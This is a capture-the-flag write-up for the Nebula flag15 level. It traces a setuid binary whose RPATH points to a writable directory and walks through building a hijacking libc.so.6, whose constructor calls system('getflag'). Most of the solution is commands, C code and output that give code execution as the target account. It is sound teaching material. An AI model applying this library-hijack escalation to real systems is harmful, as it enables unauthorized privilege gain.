## Challenge
strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.

You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.

Clean up after yourself :)

## Solution
```console
level15@nebula:/home/flag15$ ls -la
total 12
drwxr-x--- 2 flag15 level15   80 2011-11-20 21:22 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag15 flag15   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag15 flag15  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag15 level15 7161 2011-11-20 21:22 flag15
-rw-r--r-- 1 flag15 flag15   675 2011-05-18 02:54 .profile
```
`strace` you say?
```console
level15@nebula:/home/flag15$ man strace
```
```
STRACE(1)                                                                                                                                                                              STRACE(1)

NAME
       strace - trace system calls and signals

SYNOPSIS
       strace [ -CdffhiqrtttTvxx ] [ -acolumn ] [ -eexpr ] ...  [ -ofile ] [ -ppid ] ...  [ -sstrsize ] [ -uusername ] [ -Evar=val ] ...  [ -Evar ] ...  [ command [ arg ...  ] ]

       strace -c [ -eexpr ] ...  [ -Ooverhead ] [ -Ssortby ] [ command [ arg ...  ] ]

DESCRIPTION
       In  the simplest case strace runs the specified command until it exits.  It intercepts and records the system calls which are called by a process and the signals which are received by a
       process.  The name of each system call, its arguments and its return value are printed on standard error or to the file specified with the -o option.

       strace is a useful diagnostic, instructional, and debugging tool.  System administrators, diagnosticians and trouble-shooters will find it invaluable for solving problems with  programs
       for  which  the source is not readily available since they do not need to be recompiled in order to trace them.  Students, hackers and the overly-curious will find that a great deal can
       be learned about a system and its system calls by tracing even ordinary programs.  And programmers will find that since system calls and signals are events that happen at the  user/ker‐
       nel interface, a close examination of this boundary is very useful for bug isolation, sanity checking and attempting to capture race conditions.

       Each line in the trace contains the system call name, followed by its arguments in parentheses and its return value.  An example from stracing the command ``cat /dev/null'' is:

       open("/dev/null", O_RDONLY) = 3

       Errors (typically a return value of -1) have the errno symbol and error string appended.

       open("/foo/bar", O_RDONLY) = -1 ENOENT (No such file or directory)
```
Sounds very useful indeed, let's get started.
```console
level15@nebula:/home/flag15$ strace ./flag15
execve("./flag15", ["./flag15"], [/* 20 vars */]) = 0
brk(0)                                  = 0x876a000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77c0000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbf9d12a4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb77b7000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7b000
mmap2(0xcf1000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xcf1000
mmap2(0xcf4000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xcf4000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77b6000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb77b68d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xcf1000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x4c1000, 4096, PROT_READ)     = 0
munmap(0xb77b7000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77bf000
write(1, "strace it!\n", 11strace it!
)            = 11
exit_group(11)                          = ?
```
We can see a lot of attempts to open `shared-object` files from `/var/tmp/flag15/`.
```console
level15@nebula:/home/flag15$ ls -la /var/tmp/flag15
total 0
drwxrwxr-x 1 level15 level15 40 2021-07-01 14:56 .
drwxrwxrwt 1 root    root    60 2012-08-23 18:46 ..
```
We have write permissions to this directory, looks like an invitation to fill a missing `so`.
```console
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
```
What happens if we create this file and run `flag15` again?
```console
level15@nebula:/home/flag15$ touch /var/tmp/flag15/libc.so.6
level15@nebula:/home/flag15$ strace ./flag15
execve("./flag15", ["./flag15"], [/* 21 vars */]) = 0
brk(0)                                  = 0x88af000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78a1000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbfb7b384) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = 3
read(3, "", 512)                        = 0
close(3)                                = 0
writev(2, [{"./flag15", 8}, {": ", 2}, {"error while loading shared libra"..., 36}, {": ", 2}, {"/var/tmp/flag15/libc.so.6", 25}, {": ", 2}, {"file too short", 14}, {"", 0}, {"", 0}, {"\n", 1}], 10./flag15: error while loading shared libraries: /var/tmp/flag15/libc.so.6: file too short
) = 90
exit_group(127)                         = ?
```
We got an error loading `shared library`!

Let's use `file` to get more info on the executable.
```console
level15@nebula:/home/flag15$ file flag15
flag15: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
```
Notice it's dynamically linked.

We can use `readelf` to read the file's `dynamic` section.
```console
level15@nebula:/home/flag15$ readelf -d flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 0x0000000d (FINI)                       0x80484ac
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804821c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      90 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x8049ff4
 0x00000002 (PLTRELSZ)                   24 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x80482a8
 0x00000011 (REL)                        0x80482a0
 0x00000012 (RELSZ)                      8 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x8048280
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x8048276
 0x00000000 (NULL)                       0x0
```

Seems like this `ELF` was compiled with `/var/tmp/flag15` as the search path for dynamic libraries. This option's name is `RPATH` (runtime search path for the dynamic loader).

Also notice the only `shared library` the `ELF` uses (`NEEDED`) is `libc.so.6`.

Feels like it's time to write a new `so`, but before doing so...

As advised by the creators of this exercise, let's read a tad bit about the inner-workings of libraries in Linux.
```console
level15@nebula:/home/flag15$ man dlopen
```
Below is a trimmed version of the `man` page for the sake of keeping it simple, I recommend reading through the whole thing, it's not that big.
```
dlopen()
       The function dlopen() loads the dynamic library file named by the null-terminated string filename and returns an opaque "handle" for the dynamic library.

...

dlsym()
       The  function  dlsym() takes a "handle" of a dynamic library returned by dlopen() and the null-terminated symbol name, returning the address where that symbol is loaded into memory.  If
       the symbol is not found, in the specified library or any of the libraries that were automatically loaded by dlopen() when that library was loaded, dlsym()  returns  NULL.

...

dlclose()
       The function dlclose() decrements the reference count on the dynamic library handle handle.  If the reference count drops to zero and no other loaded libraries use symbols in  it,  then
       the dynamic library is unloaded.
...
```
But the real interesting part:
```
The obsolete symbols _init() and _fini()
       The  linker recognizes special symbols _init and _fini.  If a dynamic library exports a routine named _init(), then that code is executed after the loading, before dlopen() returns.  If
       the dynamic library exports a routine named _fini(), then that routine is called just before the library is unloaded.  In case you need to  avoid  linking  against  the  system  startup
       files, this can be done by using the gcc(1) -nostartfiles command-line option.

       Using  these routines, or the gcc -nostartfiles or -nostdlib options, is not recommended.  Their use may result in undesired behavior, since the constructor/destructor routines will not
       be executed (unless special measures are taken).

       Instead, libraries should export routines using the __attribute__((constructor)) and __attribute__((destructor)) function attributes.  See the gcc info pages for information  on  these.
       Constructor routines are executed before dlopen() returns, and destructor routines are executed before dlclose() returns.
...
```
Very interesting! So we can execute code from our loaded library before `dlopen()` returns.

As advised by the `man`, we'll try to use the better `__attribute__((constructor))`.

`__attribute__(())` is `gcc`'s syntax for function attributes, their purpose is to specify sepcial function properties to the compiler.

So what do we have?
1. a `setuid` `ELF`
2. that loads `libc.so.6` from `level15` writable directory `/var/tmp/flag15`
3. `shared libraries` can execute code before returning `dlopen()`

Now let's write a simple `so`.
```c
#include <stdlib.h>

void __attribute__((constructor)) run_me_first(void)
{
        system("getflag");
}
```
This is a very simple `so`, all it does is define a function that runs `getflag` before `dlopen()` returns.

Now let's compile it and run!
```console
level15@nebula:/var/tmp/flag15$ gcc evil.c -shared -o libc.so.6
level15@nebula:/var/tmp/flag15$ gcc evil.c -shared -o libc.so.6
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```
Houston we have a problem...

Seems like some version information is missing from our `so`, but there's something that bothers me more.
```console
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```
The dynamic linker tries, and fails, to find the function we call to execute `getflag`, `system()` in our implant `libc.so.6` instead of the original `libc` of the system.

Can we use `RPATH` to specify the real `libc.so.6`'s location for our implant?

But first, where is the real `libc.so.6`?
```console
level15@nebula:~$ find / -name libc.so.6 | less
```
```console
/lib/i386-linux-gnu/libc.so.6
/var/tmp/flag15/libc.so.6
/rofs/lib/i386-linux-gnu/libc.so.6
```
Alright, seems like it's in `/lib/i386-linux-gnu/libc.so.6`.

Now recompile with `RPATH`.
```console
level15@nebula:/var/tmp/flag15$ gcc evil.c -shared -Wl,-rpath=/lib/i386-linux-gnu/ -o libc.so.6
```
> Note `-Wl` specifies options to pass to the linker (in this case `ld`, the GNU linker).

And verify the result.
```console
level15@nebula:/var/tmp/flag15$ readelf -d libc.so.6

Dynamic section at offset 0xf08 contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/lib/i386-linux-gnu/]
 0x0000000c (INIT)                       0x354
 0x0000000d (FINI)                       0x4c8
 0x00000019 (INIT_ARRAY)                 0x1ef0
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x138
 0x00000005 (STRTAB)                     0x224
 0x00000006 (SYMTAB)                     0x174
 0x0000000a (STRSZ)                      160 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000003 (PLTGOT)                     0x1ff4
 0x00000002 (PLTRELSZ)                   16 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x344
 0x00000011 (REL)                        0x30c
 0x00000012 (RELSZ)                      56 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x00000016 (TEXTREL)                    0x0
 0x6ffffffe (VERNEED)                    0x2dc
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x2c4
 0x6ffffffa (RELCOUNT)                   2
 0x00000000 (NULL)                       0x0

```
Let's run it again, this time with the help of our dear friend, `strace`.
```console
level15@nebula:/var/tmp/flag15$ strace /home/flag15/flag15 2>&1 | less
```
```console
...
execve("/home/flag15/flag15", ["/home/flag15/flag15"], [/* 22 vars */]) = 0
brk(0)                                  = 0x958d000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78a4000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbfb8ff44) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\3\0\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0775, st_size=6826, ...}) = 0
mmap2(NULL, 8212, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x8db000
mmap2(0x8dc000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8dc000
close(3)                                = 0
writev(2, [{"/home/flag15/flag15", 19}, {": ", 2}, {"/var/tmp/flag15/libc.so.6", 25}, {": ", 2}, {"no version information available"..., 66}, {"\n", 1}], 6/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
) = 115
writev(2, [{"/home/flag15/flag15", 19}, {": ", 2}, {"/var/tmp/flag15/libc.so.6", 25}, {": ", 2}, {"no version information available"..., 72}, {"\n", 1}], 6/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
) = 121
writev(2, [{"/home/flag15/flag15", 19}, {": ", 2}, {"/var/tmp/flag15/libc.so.6", 25}, {": ", 2}, {"no version information available"..., 72}, {"\n", 1}], 6/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
) = 121
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78a3000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb78a3680, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0x8db000, 4096, PROT_READ|PROT_WRITE) = 0
writev(2, [{"/home/flag15/flag15", 19}, {": ", 2}, {"relocation error", 16}, {": ", 2}, {"/var/tmp/flag15/libc.so.6", 25}, {": ", 2}, {"symbol system, version GLIBC_2.0"..., 87}, {"", 0}, {"", 0}, {"\n", 1}], 10/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
) = 154
exit_group(127)                         = ?
```
I can't see an effort to dynamically load the real `libc.so.6`, maybe that's because the name of our implant and the real `so` is the same...

Let's statically link the real `so` to our implant.

Doing so with `glibc` is not recommended mainly because it was not made for static linking, there are `libc` implementations that are built for static linking, for example `musl`, but we shall try `glibc` before anything else.
```console
level15@nebula:/var/tmp/flag15$ gcc evil.c -shared -static -o libc.so.6
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __deregister_frame_info, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```
Okay, this time a different symbol is missing... Are we still dynamically linked?
```console
level15@nebula:/var/tmp/flag15$ readelf -d libc.so.6

Dynamic section at offset 0xf18 contains 23 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x3a4
 0x0000000d (FINI)                       0x50c
 0x00000019 (INIT_ARRAY)                 0x1f00
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x118
 0x00000005 (STRTAB)                     0x214
 0x00000006 (SYMTAB)                     0x154
 0x0000000a (STRSZ)                      158 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000003 (PLTGOT)                     0x1ff4
 0x00000002 (PLTRELSZ)                   8 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x39c
 0x00000011 (REL)                        0x2ec
 0x00000012 (RELSZ)                      176 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x00000016 (TEXTREL)                    0x0
 0x6ffffffe (VERNEED)                    0x2cc
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x2b2
 0x6ffffffa (RELCOUNT)                   14
 0x00000000 (NULL)                       0x0
```
Still dynamically linked to `libc`!

Maybe passing the `-static` flag to the linker will fix things?
```console
level15@nebula:/var/tmp/flag15$ gcc evil.c -shared -static -Wl,-static -o libc.so.6
level15@nebula:/var/tmp/flag15$ readelf -d libc.so.6

Dynamic section at offset 0xabec0 contains 22 entries:
  Tag        Type                         Name/Value
 0x0000000c (INIT)                       0x1ed60
 0x0000000d (FINI)                       0x85bb8
 0x00000019 (INIT_ARRAY)                 0xace70
 0x0000001b (INIT_ARRAYSZ)               8 (bytes)
 0x0000001a (FINI_ARRAY)                 0xace78
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x138
 0x00000005 (STRTAB)                     0x6944
 0x00000006 (SYMTAB)                     0x25a4
 0x0000000a (STRSZ)                      15028 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000003 (PLTGOT)                     0xacff4
 0x00000002 (PLTRELSZ)                   120 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x1ece8
 0x00000011 (REL)                        0xa3f8
 0x00000012 (RELSZ)                      84208 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x00000016 (TEXTREL)                    0x0
 0x0000001e (FLAGS)                      TEXTREL STATIC_TLS
 0x6ffffffa (RELCOUNT)                   5982
 0x00000000 (NULL)                       0x0
```
I guess it did!

Now let's run `flag15` again.
```console
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
You have successfully executed getflag on a target account
/home/flag15/flag15: relocation error: /home/flag15/flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```
Still showing errors, but it seems we managed to execute `getflag` and thus won the level!
